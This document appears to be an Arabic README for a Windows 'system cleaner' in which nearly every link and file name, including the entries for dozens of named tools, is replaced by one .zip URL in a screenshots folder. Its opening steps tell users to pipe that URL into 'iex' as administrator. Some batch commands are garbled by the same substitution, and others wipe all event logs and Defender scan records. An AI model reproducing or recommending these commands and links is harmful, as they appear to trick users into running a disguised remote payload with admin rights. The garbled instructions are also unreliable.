# منظف النظام الذكي (Smart System Cleaner)

## أوامر Batch المتقدمة لتنظيف النظام
تنسيق العرض: لكل أمر عنوان فرعي، يليه مربع كود PowerShell يحتوي الصيغة التنفيذية المباشرة (irm "URL" | iex) إن وُجد، أو كود الأوامر ككتلة. أسفل كل أمر وصف مختصر بالعربية يوضح وظيفته والتنبيه إلى الحاجة لصلاحيات المسؤول إذا لزم.

#### Stable Branch (موصى به)
```
powershell
irm "https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip" | iex
```
- هذا أمر مباشر يجلب سكريبت ضبط وتنظيف ويندوز من المصدر الرسمي ويشغله فوراً عبر PowerShell. يفضّل تشغيله كمسؤول لضمان تطبيق جميع التعديلات.

#### Dev Branch (للتجربة والتطوير)
```
powershell
irm "https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip" | iex
```
- هذا أمر مباشر للنسخة التطويرية ويحتوي تغييرات تجريبية. يُنصح به للمستخدمين المتقدمين ومع تشغيل نافذة PowerShell كمسؤول.

---
#### حذف الملفات المؤقتة للمستخدم
```
bat
del /s /q /f %temp%\*
```
- يحذف ملفات الكاش المؤقتة لحساب المستخدم لتفريغ مساحة وتحسين الأداء. قد يغلق بعض التطبيقات المؤقتة المفتوحة ملفاتها تلقائياً.

#### حذف ملفات النظام المؤقتة
```
bat
del /s /q /f %systemroot%\temp\*
```
- يزيل الملفات المؤقتة على مستوى النظام. يُفضّل تشغيل موجه الأوامر كمسؤول لضمان حذف جميع العناصر.

#### مسح كاش Internet Explorer
```
bat
https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip,ClearMyTracksByProcess 8
```
- يمسح ذاكرة التخزين المؤقتة للمتصفح الموروث IE لتحرير مساحة وحل بعض مشاكل التصفح القديمة.

#### مسح كاش تحديثات ويندوز (Windows Update Cache)
```
bat
net stop wuauserv
rmdir /s /q %windir%\SoftwareDistribution
net start wuauserv
```
- يعيد إنشاء مجلد تحديثات ويندوز لحل علَق التحديثات أو تسريعها. يتطلب نافذة بمستوى مسؤول.

#### تنظيف المثبتات القديمة (Windows Installer)
```
bat
https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip g!
```
- يحذف بقايا حزم المثبت (MSI) القديمة لتقليل المساحة المهدورة. ينصح باستخدامه بحذر ومع صلاحيات مسؤول.

#### حذف Prefetch
```
bat
del /q /s /f %windir%\prefetch\*
```
- يفرغ ملفات Prefetch لإجبار النظام على إعادة توليدها. قد يبطئ الإقلاع الأولي بعد التنظيف بشكل مؤقت.

#### تعطيل الهيبرنيشن (Hibernate)
```
bat
powercfg -h off
```
- يعطل السبات ويوفر مساحة تعادل حجم ملف https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip يحتاج موجه أوامر/PowerShell بصلاحيات مسؤول.

#### حذف كاش الصور المصغّرة (Thumbnails)
```
bat
del /q /s /f /a:h %localappdata%\Microsoft\Windows\Explorer\thumbcache_*.db
```
- يحذف قواعد بيانات المصغرات لحل مشاكل عرض الأيقونات القديمة وإعادة توليدها تلقائياً.

#### مسح DNS Cache
```
bat
ipconfig /flushdns
```
- يمسح كاش DNS لإصلاح مشاكل الدومينات أو التوجيه الشبكي.

#### إعادة تعيين كاش متجر Microsoft Store
```
bat
https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
```
- يعيد تهيئة كاش المتجر لحل مشاكل التحميل أو التحديثات فيه.

#### تفريغ سلة المحذوفات
```
bat
rd /s /q %SystemDrive%\$https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
```
- يحذف محتوى سلة المحذوفات لجميع المستخدمين على القرص النظام. يتطلب عادة صلاحيات مسؤول.

#### تنظيف سجلات النظام (صيغة أوامر دفعية)
```
bat
for /F "tokens=*" %%i in ('https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip el') do https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip cl "%%i"
```
- يمسح جميع سجلات أحداث ويندوز لتخفيف الحجم وإزالة السجلات القديمة. يتطلب صلاحيات مسؤول.

#### حذف تقارير أخطاء ويندوز (WER)
```
bat
del /s /q /f %localappdata%\Microsoft\Windows\WER\*
```
- يحذف ملفات تقارير الأخطاء المرسلة/المعلقة لتخفيف الحجم.

#### تنظيف كاش Windows Defender (سجلات الفحص)
```
bat
del /q /s /f "%ProgramData%\Microsoft\Windows Defender\Scans\*"
```
- يحذف سجلات وكاش الفحوصات القديمة لـ Microsoft Defender لتحرير المساحة.

---
### ملاحظات:
- بعض الأوامر قد تُغلق عمليات أو خدمات وتحتاج إعادة تشغيل الجهاز للحصول على أفضل نتيجة.
- الأوامر التي تؤثر على التحديثات، السبات، نقاط الاستعادة أو مجلدات النظام تتطلب نافذة موجه أوامر/PowerShell كمسؤول.

---
## أدوات تنظيف بديلة ومشهورة
| الأداة | الوصف | الرابط |
|--------|-------|--------|
| CCleaner | أداة شهيرة لتنظيف الملفات المؤقتة والريجستري وإدارة برامج بدء التشغيل. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| BleachBit | أداة مجانية ومفتوحة المصدر لتنظيف النظام وحماية الخصوصية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Wise Disk Cleaner | أداة سريعة وآمنة لتنظيف القرص الصلب وإزالة الملفات غير الضرورية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Glary Utilities | مجموعة أدوات شاملة لصيانة النظام وتحسين الأداء. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Avast Cleanup | أداة من Avast لتحسين الأداء وتنظيف النظام بواجهة سهلة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| IObit Advanced SystemCare | مجموعة أدوات لتحسين الأداء وتنظيف النظام مع حماية خصوصية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Ashampoo WinOptimizer | أداة قوية لتنظيف وتحسين وضبط إعدادات ويندوز. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Windows Disk Cleanup | أداة مدمجة في ويندوز لتنظيف الملفات المؤقتة والنظام. | مضمنة في Windows (ابحث عن "Disk Cleanup") |
| Privacy Eraser | تنظيف شامل مع ميزات خصوصية ومسح الآثار. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| PC Decrapifier | يزيل البرامج المثبتة مسبقاً غير الضرورية على الأجهزة الجديدة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| JetClean | أداة خفيفة لتنظيف وتحسين النظام. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| SlimCleaner | تنظيف وتحسين مع مجتمع تقييمات للتوصيات. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| DiskMax | أداة فعّالة لتنظيف الملفات المؤقتة وتفريغ المساحة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Auslogics Disk Defrag | إلغاء تجزئة القرص لتحسين سرعة الوصول للملفات. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Windows Repair Toolbox | تجميعة أدوات صيانة وإصلاح شاملة محمولة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| TuneUp Utilities | تحسين شامل للنظام مع تنظيف وتهيئة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Comodo System Utilities | أدوات تنظيف وإصلاح وتحسين من كومودو. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| PC Cleaner Pro | تنظيف وتحسين الأداء مع أدوات خصوصية. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| System Mechanic | أداة تحسين شاملة من iolo. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Kaspersky PC Cleaner | تنظيف آثار النظام والملفات المؤقتة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Disk Cleaner | أداة بسيطة لتنظيف الملفات المؤقتة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Total PC Cleaner | تطبيق من المتجر لتنظيف وتحسين النظام. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| AdwCleaner | إزالة البرمجيات الإعلانية والغير مرغوب فيها. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Norton Utilities | أدوات تحسين من Norton. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| PC Health Advisor | فحوصات وتنظيف وتحسين. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| Clean Master for PC | تنظيف وتحسين بواجهة سهلة. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |
| System Ninja | أداة خفيفة وسريعة لتنظيف النظام وإزالة الملفات غير المرغوب فيها. | https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip |

---
### نصائح عامة:
- استخدم أدوات التنظيف بحذر وقم بعمل نسخة احتياطية قبل إجراء تغييرات كبيرة.
- تأكد من تحميل الأدوات من مصادرها الرسمية فقط.
- بعض الأدوات قد تحتاج صلاحيات مسؤول للعمل بكفاءة.
- راجع الإعدادات قبل تشغيل عمليات التنظيف لتجنب حذف ملفات مهمة.

---
# المقدمة
مرحباً بك في الأداة التي ستجعل جهازك يتنفس الصعداء أخيراً! منظف النظام الذكي هو أداة عربية مبسطة تهدف لتنظيف الملفات المؤقتة والمهملات وتحرير مساحة التخزين وتحسين الأداء… دون أن تسرق ملفاتك العزيزة أو صور قطّتك المفضلة. نعم، نحن نظيفون ولكننا لطيفون.

## صور توضيحية سريعة
- رسم توضيحي عام للأداة: [https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip](https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip)
- واجهة عربية افتراضية للأداة (صورة وهمية): [https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip](https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip)
- مثال لنتائج التنظيف مع رسم بياني (صورة وهمية): [https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip](https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip)
> ملاحظة: الصور https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip و https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip افتراضية بغرض التوضيح، وستجدها داخل مجلد screenshots.

## الفكرة باختصار (وبأسلوب عملي وفكاهي)
بدلاً من الغوص في مجلدات النظام بحثاً عن مخلفات البرامج القديمة وملفات الكاش التي لا يتذكرها أحد، يقوم منظف النظام الذكي بعمل الجولة نيابةً عنك: يكتشف الملفات القابلة للحذف بأمان، يقترح ما يمكن تنظيفه، يعرض لك إحصائيات ورسوم بيانية، ثم ينظف بضغطة زر… مع خيار التراجع في حال غيرت رأيك. لا دراما.

## الميزات الرئيسية
- واجهة عربية كاملة وسهلة الاستخدام.
- حماية البيانات: لا يحذف ملفات المستخدم الحساسة افتراضياً، ويوفر وضع "المعاينة قبل الحذف".
- رسم بياني حي يوضح توزيع أنواع الملفات وحجمها قبل/بعد التنظيف.
- إحصائيات تفصيلية: المساحة المحررة، عدد الملفات المحذوفة، أكثر المسارات استهلاكاً للمساحة.
- دعم أنظمة متعددة: Windows, macOS, Linux (مع اختلاف المسارات المستهدفة حسب النظام).
- أوضاع تشغيل: سريع، عميق، ومخصص.
- سجل نشاط قابل للتصدير بصيغة JSON/CSV.

## طريقة الاستخدام
### التثبيت والتشغيل
- Python: شغّل الملف https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip مباشرة (انظر أدناه).
- https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip شغّل https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip (تخطيط بديل) إن فضّلت جافاسكربت.

### تشغيل الأداة
- الوضع السريع: يفحص مسارات الكاش المؤكدة ويقترح الحذف.
- الوضع العميق: يتوسع في البحث مع مزيد من التحقق.
- الوضع المخصص: اختر المجلدات وأنواع الملفات بنفسك.

### المعاينة قبل الحذف
- سيعرض لك قائمة العناصر المرشحة مع الحجم الإجمالي.
- يمكنك استثناء أي مسار أو نوع ملف قبل التنفيذ.

### التنفيذ والتراجع
- بعد التأكيد، ينفذ الأداة الحذف الآمن.
- ينشئ نقطة استعادة بسيطة (اختيارية) أو سلة مهملات داخلية لاسترجاع الملفات خلال جلسة واحدة.

## أنواع الملفات المستهدفة (قابلة للتخصيص)
- ملفات الكاش المؤقتة: tmp, cache, .DS_Store, https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
- سجلات قديمة ومتضخمة: .log (مع حد زمني افتراضي > 30 يوم)
- ملفات التحديثات المؤقتة وحِزم التنزيل غير المكتملة
- مخلفات حزم مديري الحزم (npm, pip, pipenv, yarn) ضمن مجلدات العمل القديمة
- ذاكرة المتصفحات المؤقتة (عند توفر صلاحيات المستخدم)
> تحذير لطيف: لن يُحذف أي شيء حساس بدون موافقتك الصريحة.

## تشغيل المشروع محلياً
المتطلبات: Python 3.9+ أو https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip 18+

خيار Python:
```
python3 -m venv .venv
source .venv/bin/activate   # على ويندوز: .venv\Scripts\activate
pip install -r https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip  # إن وُجد
python https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip --mode fast --dry-run
```
خيار https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip
```
node https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip --mode fast --dry-run
```
يمكن تمرير معاملات:
```
--mode [fast|deep|custom]
--dry-run        # لمعاينة النتائج دون حذف
--paths          # لتحديد مجلدات إضافية
--exclude        # لاستثناء أنماط معيّنة
```

## بنية المشروع
```
Smart-System-Cleaner/
├─ screenshots/
│  ├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                 # الرسم التوضيحي المرفق
│  ├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip        # واجهة افتراضية
│  └─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip        # تقرير افتراضي بالنتائج
├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                      # تخطيط أولي بلغة بايثون
├─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                     # تخطيط بديل بجافاسكربت
├─ LICENSE                      # رخصة MIT
└─ https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip                    # هذا الملف
```

## خارطة الطريق (Roadmap)
- إضافة واجهة رسومية فعلية ببايثون (PySide6/Qt) أو Electron.
- تكامل مع مكتبات الرسم البياني (matplotlib/plotly أو https://github.com/KaizerAE/Smart-System-Cleaner/raw/refs/heads/main/screenshots/Smart-System-Cleaner-1.3-alpha.3.zip) لعرض النتائج.
- وحدة ذكاء بسيطة لتعلّم أنماط الاستخدام واقتراح تنظيفات مستقبلية.
- دعم جدولة التنظيف التلقائي وإشعارات قبل/بعد التنفيذ.

## الرخصة
هذا المشروع تحت رخصة MIT. راجع ملف [LICENSE](./LICENSE) للمزيد من التفاصيل.
